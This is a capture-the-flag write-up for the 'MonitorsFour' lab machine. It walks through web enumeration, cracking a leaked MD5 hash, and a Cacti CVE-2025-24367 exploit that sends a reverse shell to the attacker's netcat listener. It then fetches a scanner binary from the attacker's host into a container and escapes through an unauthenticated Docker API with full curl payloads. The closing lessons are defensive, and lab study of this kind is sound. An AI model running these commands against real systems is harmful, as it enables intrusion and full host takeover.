---
title: "monitorsfour"
date: 2026-02-06
draft: false
tags: ["windows", "web", "docker", "medium"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Windows (WSL2 with Docker Desktop)"
    difficulty: "Medium"
ShowToc: true
---

# MonitorsFour

MonitorsFour is a medium-difficulty Windows box running WSL2 with Docker Desktop — a setup that makes the attack chain distinctly layered. The path runs from web enumeration through an authenticated Cacti RCE, into a Docker container, and finally out to the Windows host via an unauthenticated Docker API. Each pivot requires a slightly different mindset, which is what makes this box a great exercise in chained exploitation.

---

## Reconnaissance

### Port Scanning

Starting with a standard nmap scan against the target:

```bash
nmap -sC -sV -oA nmap/monitorsfour <TARGET>
```

Two ports stood out immediately:

- **Port 80** — nginx, redirecting to `http://monitorsfour.htb/`
- **Port 5985** — WinRM (Microsoft HTTPAPI 2.0)

The WinRM port was interesting but would have to wait — without credentials, there's nothing to do there yet. I added `monitorsfour.htb` to `/etc/hosts` and moved on to web enumeration.

### Web Enumeration

The main site at `http://monitorsfour.htb/` is a corporate landing page with a login at `/login` and a password reset at `/forgot-password`. The backend is PHP 8.3.27 on nginx. Login posts to `/api/v1/auth` and the password reset flow hits `/api/v1/reset` — both worth keeping in mind.

Subdomain enumeration turned up something useful:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" \
  -fc 301,302 -mc all
```

This revealed `cacti.monitorsfour.htb`, which hosts a Cacti 1.2.26 network monitoring instance. Adding that to `/etc/hosts` and browsing to it shows the familiar Cacti login page. I noted the version — 1.2.26 — and kept it in mind for later.

Back on the main site, the default wordlists weren't giving much. Switching to larger lists paid off:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
  -u http://monitorsfour.htb/FUZZ -mc 200,301,302,403
```

Two finds stood out:

1. **An exposed `.env` file** — containing application configuration. These often hold database credentials, API keys, or other secrets.
2. **A user enumeration endpoint** at `http://monitorsfour.htb/user?token=0` — iterating the token value reveals user records.

Probing the user endpoint revealed a Marcus account. The `.env` file and some further digging into the Cacti instance produced a password hash. Cracking it with a standard wordlist attack:

```bash
hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt
```

The MD5 hash cracked to `wonderful1`. Credentials: `marcus:wonderful1`.

---

## Foothold

### CVE-2025-24367 — Cacti Authenticated RCE

Cacti 1.2.26 is vulnerable to CVE-2025-24367, an authenticated remote code execution flaw via the Graph Template functionality. "Authenticated" is key here — this is why obtaining Marcus's credentials mattered. Unauthenticated exploits are easier to find but authenticated ones often get overlooked during triage.

I grabbed the PoC from [TheCyberGeek's GitHub](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC) and set up a netcat listener:

```bash
nc -lvnp 4444
```

Then fired the exploit:

```bash
python3 exploit.py -u marcus -p wonderful1 -i <VPN_IP> -l 4444 \
  -url http://cacti.monitorsfour.htb/cacti
```

Shell landed as `www-data`. First thing — figure out where we are.

### Container Enumeration

A few quick checks confirmed this was a Docker container, not the host:

```bash
cat /proc/1/cgroup
hostname
uname -r
```

The kernel version (`6.6.87.2-microsoft-standard-WSL2`) confirmed we're inside WSL2. The container is Debian 13 (Trixie), with a container ID of `821fbd6a43fa` and an IP of `172.18.0.3`. The gateway sits at `172.18.0.1`.

The most important discovery at this stage came from a file that's easy to overlook:

```bash
cat /etc/resolv.conf
```

This revealed the Docker host's IP: `192.168.65.7`. On Docker Desktop for Windows, this is the internal address of the Windows host as seen from within the WSL2 VM. That address is the next target.

The user flag was sitting in the container's filesystem:

```bash
cat /home/marcus/user.txt
```

---

## Privilege Escalation

### Internal Network Scanning

To pivot toward `192.168.65.7`, I needed a port scanner inside the container. The container has no nmap, but I could serve a binary from my Kali machine:

```bash
# On Kali — serve fscan from the current directory
python3 -m http.server 8000
```

```bash
# In the container — download fscan
curl http://<VPN_IP>:8000/fscan -o /tmp/fscan
chmod +x /tmp/fscan
```

Then scan the Docker host:

```bash
./fscan -h 192.168.65.7 -p 1-65535
```

The results were immediately interesting:

- **Port 2375** — Docker API, **unauthenticated**
- Port 53 — DNS
- Port 3128 — Proxy
- Port 5555 — Unknown

fscan even flagged this automatically: `poc-yaml-docker-api-unauthorized-rce`. An unauthenticated Docker API is a complete host compromise waiting to happen.

### Exploiting the Unauthenticated Docker API

Port 2375 is the Docker daemon's unencrypted API port. When exposed without authentication, anyone who can reach it has full control over the Docker engine — including the ability to create privileged containers with the host filesystem mounted. This is exactly as bad as it sounds.

First, verify access and get a lay of the land:

```bash
# Confirm API is accessible
curl http://192.168.65.7:2375/version

# List running containers
curl http://192.168.65.7:2375/containers/json
```

The version endpoint responded cleanly, and the containers list showed the existing setup. The project path in the container metadata revealed `C:\Users\Administrator\Documents\docker_setup` — confirming we're targeting the Administrator account on a Windows host.

Now the actual exploit. The strategy: create a new privileged container using an existing image (alpine is lightweight and almost always present), mount the entire host filesystem into it at `/hostfs`, and then use the API's exec functionality to run commands inside that container with full host access.

**Step 1 — Create the container:**

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/create?name=pwned \
  -d '{
    "Image": "alpine",
    "Cmd": ["tail", "-f", "/dev/null"],
    "HostConfig": {
      "Privileged": true,
      "Binds": ["/:/hostfs"]
    }
  }'
```

The `tail -f /dev/null` keeps the container running without doing anything. `Privileged: true` removes the security restrictions. `Binds: ["/:/hostfs"]` mounts the host root filesystem at `/hostfs` inside the container. Save the returned container ID.

**Step 2 — Start it:**

```bash
curl -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/start
```

**Step 3 — Create an exec to locate the flag:**

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/CONTAINER_ID/exec \
  -d '{
    "AttachStdout": true,
    "AttachStderr": true,
    "Cmd": ["find", "/hostfs", "-name", "root.txt"]
  }'
```

This returns an exec ID. The exec is queued but not yet running.

**Step 4 — Start the exec and read the output:**

```bash
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/exec/EXEC_ID/start \
  -d '{"Detach": false, "Tty": false}' --output -
```

The find command returned the path: `/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt`.

This path is worth understanding. On WSL2, the Windows filesystem is accessible within the Linux environment at `/mnt/host/c`. So from within our privileged container, `C:\Users\Administrator\Desktop\root.txt` appears at `/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt`.

Reading the flag is the same exec flow with `cat` instead of `find`:

```bash
# Create exec
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/containers/CONTAINER_ID/exec \
  -d '{
    "AttachStdout": true,
    "AttachStderr": true,
    "Cmd": ["cat", "/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt"]
  }'

# Run it
curl -X POST -H "Content-Type: application/json" \
  http://192.168.65.7:2375/exec/EXEC_ID/start \
  -d '{"Detach": false, "Tty": false}' --output -
```

Root flag: [redacted].

---

## Lessons Learned

**1. Bigger wordlists matter.** The `.env` file and user enumeration endpoint that cracked this box open were only found with larger wordlists. Default lists miss things. When the low-hanging fruit is gone, escalate your enumeration.

**2. Check `/etc/resolv.conf` in containers.** It's a quick, reliable way to find the Docker host IP on Docker Desktop setups. On a WSL2/Docker Desktop environment, that `192.168.65.x` range is a giveaway.

**3. Unauthenticated Docker API (port 2375) is game over.** If you're running Docker Desktop and port 2375 is reachable — even from an internal network — any compromised container on that network can own the host. Bind Docker to a socket, enable TLS, or firewall the port. There's no middle ground here.

**4. Authenticated RCE vulnerabilities are still serious.** CVE-2025-24367 requires credentials, which might make it seem less critical in a triage context. But credential reuse and exposed hashes meant those credentials weren't hard to obtain. Don't discount "authenticated" vulns — the authentication barrier is often thin.

**5. WSL2 filesystem paths are non-obvious.** The Windows `C:\` drive appears at `/mnt/host/c` inside WSL2 Docker containers. Knowing this is the difference between finding the flag and spending 20 minutes confused by an unexpected directory structure.

**6. fscan is excellent for internal pivots.** When you're working from a container with no native tooling, a single static binary like fscan can completely map an internal network and identify known vulnerabilities automatically. Keep it in your toolkit.

**7. The Docker API is RESTful — you don't need the CLI.** Everything the `docker` command can do, you can do with `curl` against the API. This matters when you're pivoting through a constrained environment and can't install tooling.
